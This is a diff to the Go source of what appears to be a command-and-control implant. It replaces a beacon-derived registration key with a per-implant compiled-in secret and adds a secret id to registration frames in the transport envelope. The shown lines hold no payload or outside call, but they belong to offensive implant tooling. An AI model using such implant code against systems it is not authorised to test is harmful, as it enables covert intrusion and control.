@@ -367,10 +367,11 @@ func main() {
 	// Initial registration / first beacon
 	agentUUID = registerOrGetUUID()
 
-	// v2 protocol state: registration key derived from the compiled-in beacon
-	// key (never transmitted), persisted sequence + registered marker so a
-	// restart continues the same session timeline.
-	agentRegKey = deriveAgentRegKey(beaconKey, agentUUID)
+	// Protocol state: registration key. v3 uses a per-implant secret compiled
+	// into this binary (never the fleet master key); v2 derives from the
+	// compiled-in beacon key. Never transmitted; persisted sequence +
+	// registered marker so a restart continues the same session timeline.
+	agentRegKey = loadAgentRegKey()
 	loadBeaconState()
 
 	// Mark as SMB child if using SMB transport
@@ -1131,7 +1132,8 @@ func verifyResponseMAC(seq uint64, serverPubB64, macB64 string) bool {
 }
 
 // v2Envelope is the top-level transport envelope (mirrors the server's
-// beaconEnvelope field layout).
+// beaconEnvelope field layout). SecretID is the v3 per-implant secret id,
+// carried only on registration frames.
 type v2Envelope struct {
 	UUID        string `json:"uuid"`
 	Seq         uint64 `json:"seq,omitempty"`
@@ -1141,6 +1143,7 @@ type v2Envelope struct {
 	Mac         string `json:"mac,omitempty"`
 	IdentityPub string `json:"id_pub,omitempty"`
 	RegHMAC     string `json:"reg_hmac,omitempty"`
+	SecretID    string `json:"secret_id,omitempty"`
 }
 
 // buildBeaconEnvelope wraps a plaintext beacon request in the v2 transport
@@ -1172,6 +1175,7 @@ func buildBeaconEnvelope(body []byte) (sendBody []byte, kind agentFrameKind, seq
 		}
 		env.ECDHPub = idPub
 		env.IdentityPub = idPub
+		env.SecretID = RegSecretIDStr
 		env.RegHMAC = base64.StdEncoding.EncodeToString(computeRegHMAC(agentRegKey, agentUUID, idPub, ts))
 	case ecdhSess.needsHandshake() || rekey:
 		// Authenticated handshake with a fresh ephemeral key.
